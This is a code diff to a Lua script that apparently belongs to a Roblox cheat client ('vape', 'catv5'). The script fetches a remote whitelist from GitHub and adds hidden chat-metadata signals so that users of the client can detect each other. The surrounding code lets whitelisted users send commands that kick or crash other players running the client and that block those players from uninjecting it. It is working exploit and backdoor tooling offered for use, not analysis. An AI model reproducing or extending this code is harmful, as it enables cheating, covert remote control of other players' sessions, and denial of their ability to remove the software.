@@ -78,6 +78,7 @@ local function transformImage(img, txt)
 end
 
 local wlplrs = {}
+local dtcTable = {}
 local commands = {
     kick = function(...)
         lplr:Kick(table.concat({...}, ' '))
@@ -129,17 +130,11 @@ local commands = {
     end,
     reveal = function()
         for i,v in wlplrs do
+            dtcTable[v] = false
             if serv.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-                local oldchannel = serv.TextChatService.ChatInputBarConfiguration.TargetTextChannel
-                local new = serv.RobloxReplicatedStorage.ExperienceChat.WhisperChat:InvokeServer(v.UserId)
-                if new then
-                    new:SendAsync('himynameiscatv5')
-                else
-                    serv.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('himynameiscatv5')
-                end
-                serv.TextChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+                serv.TextChatService.TextChannels.RBXGeneral:SendAsync('', 'catv5')
             else
-                serv.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('himynameiscatv5', v.Name)
+                serv.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('himynameiscatvape', v.Name)
             end
         end
     end,
@@ -224,7 +219,7 @@ local commands = {
 
     end,
     chat = function(...)
-        serv.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(table.concat({...}, ' '))
+        serv.TextChatService.TextChannels.RBXGeneral:SendAsync(table.concat({...}, ' '))
     end,
     crash = function()
         local sgui = Instance.new("ScreenGui", game.CoreGui)
@@ -239,11 +234,22 @@ local commands = {
 
 local response = serv.HttpService:JSONDecode(game:HttpGet('https://raw.githubusercontent.com/ah2r/whitelist/main/whitelist.json'))
 
-local selfWhitelisted = response.WhitelistedUsers[tostring(lplr.UserId)]
+local function getUserByHash(hash)
+    for i,v in response.WhitelistedUsers do
+        if not v or typeof(v) ~= 'table' then continue end
+        local hash1 = v.hash:lower():gsub(' ', '')
+        local hash2 = hash:lower():gsub(' ', '')
+        if hash1 == hash2 then
+            return v
+        end
+    end
+end
+
+local selfWhitelisted = response.WhitelistedUsers[tostring(lplr.UserId)] or getUserByHash(vape.Libraries.hash.sha512(lplr.Name.. lplr.UserId.. 'SelfReport'))
 local wldata = {}
 
 local addplayer = function(v)
-    local whitelistInfo = response.WhitelistedUsers[tostring(v.UserId)]
+    local whitelistInfo = response.WhitelistedUsers[tostring(v.UserId)] or getUserByHash(vape.Libraries.hash.sha512(v.Name.. v.UserId.. 'SelfReport'))
     if whitelistInfo then
         table.insert(wlplrs, v)
         vape.Libraries.whitelist.customtags[v.Name] = {{text = whitelistInfo.tags[1].text, color = Color3.fromRGB(table.concat(whitelistInfo.tags[1].color))}}
@@ -262,18 +268,11 @@ local addplayer = function(v)
                     end
                 end
             end)
-            vape.Uninject = function() commands.notify('nice try bozo') end
+            vape.Uninject = function() commands.notify('Failed to uninject') end
             if serv.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-                local oldchannel = serv.TextChatService.ChatInputBarConfiguration.TargetTextChannel
-                local new = serv.RobloxReplicatedStorage.ExperienceChat.WhisperChat:InvokeServer(v.UserId)
-                if new then
-                    new:SendAsync('himynameiscatv5')
-                else
-                    serv.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('himynameiscatv5')
-                end
-                serv.TextChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+                serv.TextChatService.TextChannels.RBXGeneral:SendAsync('', 'catv5')
             else
-                serv.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('himynameiscatv5', v.Name)
+                serv.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('himynameiscatvape', 'All')
             end
         end
     end
@@ -285,11 +284,9 @@ end
 
 local hacks = {}
 local addcatCheck = function(v)
-    local alreadyDetected = false
-
-    chatSignals[v].Event:Connect(function(message)
-        if message == 'himynameiscatv5' and selfWhitelisted and not alreadyDetected then
-            alreadyDetected = true
+    chatSignals[v].Event:Connect(function(message, metadata)
+        if (metadata == 'catv5' or message == 'himynameiscatvape') and selfWhitelisted and not dtcTable[v] then
+            dtcTable[v] = true
             table.insert(shared.vape.hackerTable, v)
             table.insert(hacks, v)
             vape.Libraries.whitelist.customtags[v.Name] = {{text = 'CAT USER', color = Color3.new(0, 0, 1)}}
@@ -328,12 +325,14 @@ task.spawn(function()
             if blocks[func] then return message end
 
             local class = Instance.new('TextChatMessageProperties')
+            local properties = textChatService.ChatWindowConfiguration:DeriveNewMessageProperties()
+            message.ChatWindowMessageProperties = properties
 
             if message.TextSource then
                 local plr = serv.Players:GetPlayerByUserId(message.TextSource.UserId)
 
                 if plr then
-                    chatSignals[plr]:Fire(message.Text)
+                    chatSignals[plr]:Fire(message.Text, message.Metadata)
                     if table.find(wlplrs, plr) then
                         local color = wldata[plr].tags[1].color
                         local tag = wldata[plr].tags[1].text
@@ -354,6 +353,12 @@ task.spawn(function()
         textChatService.OnIncomingMessage = func
 
         task.wait(5)
+        for i,v in wlplrs do
+            if not selfWhitelisted or response.WhitelistedUsers[tostring(v.UserId)].level < selfWhitelisted.level then
+                serv.TextChatService.TextChannels.RBXGeneral:SendAsync('', 'catv5')
+                break
+            end
+        end
         blocks[func] = true
     until false
 end)
